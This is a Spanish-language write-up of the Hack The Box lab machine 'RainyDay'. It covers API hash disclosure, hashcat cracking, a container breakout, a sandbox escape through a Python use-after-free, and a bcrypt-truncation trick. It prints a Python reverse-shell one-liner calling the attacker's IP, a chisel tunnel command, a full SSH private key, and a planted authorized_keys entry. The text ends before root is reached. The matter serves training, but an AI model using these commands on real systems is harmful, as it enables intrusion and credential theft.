---
layout: post
title: RainyDay
date: 2023-02-23
description:
img:
fig-caption:
tags: [OSCP]
---
___

<center><img src="/writeups/assets/img/RainyDay-htb/RainyDay.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de API

* Obtención de hash provocando un error en python (al convertir a entero)

* Information Disclosure

* Ejecución de comandos en Docker

* Pivoting

* LFI en tarea ejecutándose

* Exploit Python (use-after-free)

* Abuso de script SUID 1

* Reto de criptografía

* Uso de emogis para bypassear restricciones

* Obtención de secreto para regla de hascat (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.184 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 20:39 GMT
Nmap scan report for 10.10.11.184
Host is up (0.072s latency).
Not shown: 64132 closed tcp ports (reset), 1401 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.58 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.184 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 20:40 GMT
Nmap scan report for 10.10.11.184
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48dde361dc5d5878f881dd6172fe6581 (ECDSA)
|_  256 adbf0bc8520f49a9a0ac682a2525cd6d (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://rainycloud.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds
```

Añado el dominio ```rainycloud.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con whatweb, analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.184
http://10.10.11.184 [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.184], RedirectLocation[http://rainycloud.htb], Title[Redirecting...], nginx[1.18.0]
http://rainycloud.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.184], JQuery, Script, Title[RainyCloud Service], nginx[1.18.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/RainyDay-htb/1.png" alt="">

Una sección contiene un panel de inicio de sesión. No tengo credenciales válidas, pero tampoco me puedo registrar

<img src="/writeups/assets/img/RainyDay-htb/2.png" alt="">

<img src="/writeups/assets/img/RainyDay-htb/3.png" alt="">

En el error se leakea una ruta de un script en python

<img src="/writeups/assets/img/RainyDay-htb/4.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://rainycloud.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://rainycloud.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/22 20:48:31 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 3254]
/new                  (Status: 302) [Size: 199] [--> /login]
/register             (Status: 200) [Size: 3686]            
/api                  (Status: 308) [Size: 239] [--> http://rainycloud.htb/api/]
/logout               (Status: 302) [Size: 189] [--> /]                         
/containers           (Status: 302) [Size: 199] [--> /login]                    
                                                                                
===============================================================
2023/02/22 20:59:49 Finished
===============================================================
```

Cuando una ruta no existe, el servidor devuelve una respuesta típica de ```Flask```

<img src="/writeups/assets/img/RainyDay-htb/5.png" alt="">

Encuentro un subdominio

```null
gobuster vhost -u http://rainycloud.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://rainycloud.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/22 21:02:50 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.rainycloud.htb (Status: 403) [Size: 26]
                                                  
===============================================================
2023/02/22 21:03:00 Finished
===============================================================
```

Lo añado al ```/etc/hosts```

Pero no tengo acceso

```null
curl -s -X GET http://dev.rainycloud.htb; echo
Access Denied - Invalid IP
```

Tramito una petición por GET a la API

```null
curl -s -X GET http://rainycloud.htb/api/
<h1> API v0.1 </h1>
Welcome to the RainyCloud dev API. This is UNFINISHED and should not be used without permission.
<table>
  <tr>
    <th>Endpoint</th>
    <th>Description</th>
  </tr>
  <tr>
    <td><pre>/api/</pre></td>
    <td>This page</td>
  </tr>
  <tr>
    <td><pre>/api/list</pre></td>
    <td>Lists containers</td>
  </tr>
  <tr>
    <td><pre>/api/healthcheck</pre></td>
    <td>Checks the health of the website (path, type and pattern parameters only available internally)</td>
  </tr>
  <tr>
    <td><pre>/api/user/&lt;id&gt;</pre></td>
    <td>Gets information about the given user. Can only view current user information</td>
  </tr>
```

Al listar los contenedores, puedo ver un usuario

```null
curl -s -X GET http://rainycloud.htb/api/list | jq
{
  "secrets": {
    "image": "alpine-python:latest",
    "user": "jack"
  }
}
```

Pruebo a listar información de los usuarios, pero no conozco cual es la estructura del ID

```null
curl -s -X GET http://rainycloud.htb/api/user/1
{"Error":"Not allowed to view other users info!"}
```

Al introducir un punto, la respuesta cambia

```null
curl -s -X GET http://rainycloud.htb/api/user/1.0
{}
```

Como ya vi que se estaba utilizando python por detrás, se puede intentar poner un número decimal como identificador, ya que en caso de que lo tome como string, se produce un error y lo toma por válido

```null
python3
Python 3.11.1 (main, Dec 31 2022, 10:23:59) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> int(1.0)
1
>>> int("1.0")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: invalid literal for int() with base 10: '1.0'
```

Puedo obtener un usuario con su contraseña en bcrypt

```null
curl -s -X GET http://rainycloud.htb/api/user/1.0 | jq
{
  "id": 1,
  "password": "$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O",
  "username": "jack"
}
```

El único que se puede crackear es el del usuario ```gary```

```null
curl -s -X GET http://rainycloud.htb/api/user/3.0 | jq
{
  "id": 3,
  "password": "$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG",
  "username": "gary"
}
```

```null
PS C:\Users\Usuario\Downloads\hashcat-6.2.6> .\hashcat.exe -m 3200 .\hashes.txt .\rockyou.txt

...

$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG:rubberducky

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8k...tDuAuG
Time.Started.....: Thu Feb 23 10:44:20 2023 (1 min, 1 sec)
Time.Estimated...: Thu Feb 23 10:45:21 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      149 H/s (12.74ms) @ Accel:1 Loops:16 Thr:16 Vec:1
Speed.#3.........:        3 H/s (22.72ms) @ Accel:1 Loops:1 Thr:16 Vec:1
Speed.#*.........:      152 H/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 9120/14344385 (0.06%)
Rejected.........: 0/9120 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096
Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:2239-2240
Candidate.Engine.: Device Generator
Candidates.#1....: jordans -> 12356
Candidates.#3....: 123456 -> michael1
Hardware.Mon.#1..: Temp: 54c Util: 98% Core:1680MHz Mem: 810MHz Bus:16
Hardware.Mon.#3..: N/A

Started: Thu Feb 23 10:43:41 2023
Stopped: Thu Feb 23 10:45:23 2023
```

Me puedo loggear como este usuario y crear un contenedor que permite ejecutar comandos, y por tanto, enviarme una reverse shell con un oneliner de python3

<img src="/writeups/assets/img/RainyDay-htb/6.png" alt="">

<img src="/writeups/assets/img/RainyDay-htb/7.png" alt="">

La recibo en una sesión de netcat

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.184] 58724
/ $ python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
/ $ ^[[6;5R^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
/ $ export TERM=xterm
/ $ export SHELL=bash
/ $ stty rows 55 columns 209
```

Estoy dentro de un contenedor

```null
/ $ hostname -i
172.18.0.3
```

Mi identificador de usuario no existe

```null
/ $ whoami
whoami: unknown uid 1000
```

# Intrusión (No intencionada)

Dentro de los procesos existentes ejecutados por mi usuario, se encuentra un ```sleep``` con un tiempo muy alto

```null
/proc/1196 $ ps -e | grep 1000
 1196 1000      0:00 sleep 100000000
 1958 1000      0:00 python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.7",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
 1965 1000      0:00 sh
 1978 1000      0:00 python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.7",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
 1985 1000      0:00 sh
 1988 1000      0:00 python3 -c import pty; pty.spawn("/bin/sh")
 1989 1000      0:00 /bin/sh
 2021 1000      0:00 ./chisel client 10.10.16.7:1234 R:socks
 7455 1000      0:00 ps -e
 7456 1000      0:00 grep 1000
 ```

Me dirijo a la ruta ```/proc/1196```. Dentro hay enlaces simbólicos, como si se estuviera montando parte de la máquina host en el contenedor

```null
lrwxrwxrwx    1 1000     1000             0 Feb 23 10:23 cwd -> /home/jack
lrwxrwxrwx    1 1000     1000             0 Feb 23 10:23 exe -> /usr/bin/sleep
lrwxrwxrwx    1 1000     1000             0 Feb 23 10:23 root -> /
```

Puedo ver la primera flag

```null
sh: getcwd: No such file or directory
(unknown) $ ls
user.txt
sh: getcwd: No such file or directory
(unknown) $ cat user.txt 
efe9311bfd0b68781db6f9e50abb16bc
sh: getcwd: No such file or directory
```

Copio su clave privada de acceso por SSH para conectarme sin proporcionar contraseña

```null
(unknown) $ cat .ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

# Escalada

Puedo ejecutar un binario llamado ```safe_python``` como el usuario ```jack_adm```, pasándole cualquier argumento y sin proporcionar contraseña contraseña

Está tratando de abrir un archivo

```null
jack@rainyday:~$ sudo -u jack_adm /usr/bin/safe_python
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 28, in <module>
    with open(sys.argv[1]) as f:
IndexError: list index out of range
```

Creo un archivo

```null
jack@rainyday:~$ touch test
```

Al ejecutar de nuevo, no aparece ningún output

```null
jack@rainyday:/tmp$ sudo -u jack_adm /usr/bin/safe_python test 
```

Voy a suponer que espera un script de python

```null
jack@rainyday:/tmp$ cat test.py 
import os

os.system("whoami")
```

Al volver a ejecutar, devuelve un error

```null
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in <module>
    exec(f.read(), env)
  File "<string>", line 1, in <module>
ImportError: __import__ not found
```

Pruebo a leer un archivo local

```null
print(open("/etc/passwd").read())
```

```null
jack@rainyday:/tmp$ sudo -u jack_adm /usr/bin/safe_python test.py 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
www:x:1001:1001::/var/www:/bin/false
jack_adm:x:1002:1002:Jack Admin,,,:/home/jack_adm:/bin/bash
```

Como es vulnerable a LFI, en caso de que tenga una clave privada de acceso por SSH la podré obtener

```null
jack@rainyday:/tmp$ sudo -u jack_adm /usr/bin/safe_python test.py 
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in <module>
    exec(f.read(), env)
  File "<string>", line 1, in <module>
FileNotFoundError: [Errno 2] No such file or directory: '/home/jack_adm/.ssh/id_rsa'
```

Pero no existe

```null
jack@rainyday:/tmp$ sudo -u jack_adm /usr/bin/safe_python test.py 
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in <module>
    exec(f.read(), env)
  File "<string>", line 1, in <module>
FileNotFoundError: [Errno 2] No such file or directory: '/home/jack_adm/.ssh/id_rsa'
```

Como no parece haber una forma sencilla de inyectar comandos en el código, busco en Google por la vulnerabilidad de python que surgió hace casi un año, abusando de ```use-after-free```. Está todo detallado en este [artículo](https://pwn.win/2022/05/11/python-buffered-reader.html). Al final del todo, comparten un exploit, disponible en [Github]()

Al ejecutar gano acceso como ```jac_adm```

```null

jack@rainyday:/tmp$ sudo -u jack_adm /usr/bin/safe_python test.py 
[*] .dynamic:   0x55e2ad343be8
[*] DT_SYMTAB:  0x55e2acde25f8
[*] DT_STRTAB:  0x55e2acdef300
[*] DT_RELA:    0x55e2ace48560
[*] DT_PLTGOT:  0x55e2ad343e08
[*] DT_INIT:    0x55e2ace4c000
[*] Found system at rela index 97
[*] Full RELRO binary, reading system address from GOT
[*] system:     0x7f5161e00d60
$ whoami
jack_adm
```

Genero un par de claves para conectarme por SSH

```null
$ ssh-keygen
```

Y meto mi clave pública en las authorized_keys

```null
$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCji8ibO+QRRqf4hWb7EJLmqidhSvKIjV1U+qi910slj9DBWUktU2Z6dX+QBJHm1kiHbUFsxx4r3PQEUqS3BvWEOjZlORb2ee0RDbfNvJpxhsispuDAMaZpalyF/0I+gyYtvKLqUBmn8FSx4AxcE/hsiLDAD9s/xjbMAljzJB+D1UUPHeFy7QVETaG3+kQooId6OkWGzpb1KzZbFYVNspcMLfJPSsqOc3Mgvzvnbo7YJ2Lgrx1Wkct5qMWWq6A8Mc0hSu3jp6ZRqgQdua/jwzdUOGlYSA85goIyGnDD1a7x0g4+fZ3hqNDyPzO+DliSrdmHnPR1btN9Dsq3OC72+TxUSbu46YnKVC8hEhcTjSQ5r7AdcQ3tTZD7MR1V7wVlD4yuWBPVHBn7yDshXdqaMAvZtdjH/+0jWiBvoB3p0tEEAbkWILKjkR0DHeuAQwFytpLyxR4jZFaIE8FoZHV/5NHJevmgRRsGi0m3AGwIXUDY1fDoi35gLhaa17hjAbU+LEc= root@kali' > authorized_keys
```

Gano acceso

```null
ssh jack_adm@10.10.11.184

jack_adm@rainyday:~$ 
```

Tengo otro privilegio a nivel de sudoers, pero ahora

```null
jack_adm@rainyday:~$ sudo -l
Matching Defaults entries for jack_adm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack_adm may run the following commands on localhost:
    (root) NOPASSWD: /opt/hash_system/hash_password.py
```

Se trata de un script que solucita una contraseña para transformarla a bcrypt

```null
jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> 123
[+] Hash: $2b$05$cqb7Puw5aLq8huJHT9UoReg76oxmQZUAMH6qGZScIZLx3Hf01iuiy
```

El tamaño máximo que admite brypt son 72 bytes. Si introduzco más de 30 caracteres, el hash no se computa

```null
jack_adm@rainyday:~$ /opt/hash_system/hash_password.py
-bash: /opt/hash_system/hash_password.py: Permission denied
jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Hash: $2b$05$lPgOKNCYJmsLwBAwOk6esO1Q4QRIiFchwqPGi.a9PFeEDY0KJeLza
jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Invalid Input Length! Must be <= 30 and >0
```

Pero no todos los caracteres tienen el mismo tamaño. Copio un icono cualquiera de [HackNerdFonts](https://www.nerdfonts.com/cheat-sheet) para la demostración

```null
>>> len("A".encode())
1
>>> len("梅".encode())
3
```

Teniendo esto en cuenta, genero hashes con el mismo caracteres de este tipo, entre 16-22 que está en el rango que supera al tamaño restringido (60 bytes) y menor al máximo de bcrypt (72 bytes), para almacenarlos en un archivo

```null
jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> 梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅
[+] Hash: $2b$05$..GCkVlp6QcR0NBnh9qImunXYaH4TUk/7hTh1kekY5mDZuCST/Rv2
jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> 梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅  
[+] Hash: $2b$05$lcw.4SZPLF.tbe3jIF9lC.66P9ZlxyRT.qGHBPwL66V8mGGGY57bi
jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> 梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅    
[+] Hash: $2b$05$A6lk9g6Sy17/AQP4O7NHieYe0DNeh4ut6q50rrs5UZtBMzC2YfR1q
jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> 梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅      
[+] Hash: $2b$05$wL3Y2VuH9n.KDur/Ih5cV.XQWjrzwMCChvsRcI4R/YlgppojUM6eG
```

Los crackeo utilizando el siguiente diccionario de contraseñas

```null
梅
梅梅
梅梅梅梅
梅梅梅梅梅
梅梅梅梅梅梅
```

```null
PS C:\Users\Usuario\Downloads\hashcat-6.2.6> .\hashcat.exe -m 3200 .\hashes.txt .\dictionary.txt
...

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

$2b$05$ijv3cqkK2jKU94sg9ROtb.wL5rbDHPmK.VqXGegmnDzWqXftEkpP.:´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä
$2b$05$lzinNrjsxSieeWwEtv4hcuPaTdaEeZJze5KBl.U..rAm.vmCH.piq:´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä
$2b$05$uoUjZ.jzeaywBxYaSKwAR.R8Te57Ru41FFhJV16fjY.v0Gdhir4WO:´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: .\hashes.txt
Time.Started.....: Thu Feb 23 17:10:21 2023 (1 sec)
Time.Estimated...: Thu Feb 23 17:10:22 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\dictionary.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        0 H/s (0.00ms) @ Accel:1 Loops:16 Thr:16 Vec:1
Speed.#3.........:       10 H/s (2.56ms) @ Accel:1 Loops:1 Thr:16 Vec:1
Speed.#*.........:       10 H/s
Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
Progress.........: 9/9 (100.00%)
Rejected.........: 6/9 (66.67%)
Restore.Point....: 0/3 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-0 Iteration:0-16
Restore.Sub.#3...: Salt:2 Amplifier:0-1 Iteration:31-32
Candidate.Engine.: Device Generator
Candidates.#1....: [Copying]
Candidates.#3....: ´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä -> ´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä´®ä
Hardware.Mon.#1..: Temp: 51c Util:  0% Core: 300MHz Mem: 405MHz Bus:16
Hardware.Mon.#3..: N/A

Started: Thu Feb 23 17:09:52 2023
Stopped: Thu Feb 23 17:10:23 2023
```

Todos los hashes corresponden a la misma contraseña, ya que se ha sobrepasado el buffer

```null
>>> bcrypt.checkpw(("梅"*24).encode(), b"$2b$05$uoUjZ.jzeaywBxYaSKwAR.R8Te57Ru41FFhJV16fjY.v0Gdhir4WO")
True
>>> bcrypt.checkpw(("梅"*25).encode(), b"$2b$05$lzinNrjsxSieeWwEtv4hcuPaTdaEeZJze5KBl.U..rAm.vmCH.piq")
True
>>> bcrypt.checkpw(("梅"*26).encode(), b"$2b$05$ijv3cqkK2jKU94sg9ROtb.wL5rbDHPmK.VqXGegmnDzWqXftEkpP.")
True
>>> bcrypt.checkpw(("梅"*25).encode(), b"$2b$05$H8fEfJcN880imxykBViAS.zltB8OQnCoXzY3x6fP.j.JXm4mWaZaW")
True
>>> bcrypt.checkpw(("梅"*24).encode(), b"$2b$05$tiRjjYiKVNviuVeupmnKAeFicYHjIdaQOcBJ4e3UBfLYyskazmrAG")
True
>>> bcrypt.checkpw(("梅"*23).encode(), b"$2b$05$llFj/PbcyNQZOU0GoYdycunV.mVlxamwck1xRqKA4kKHOw8ObNpwq")
False
```

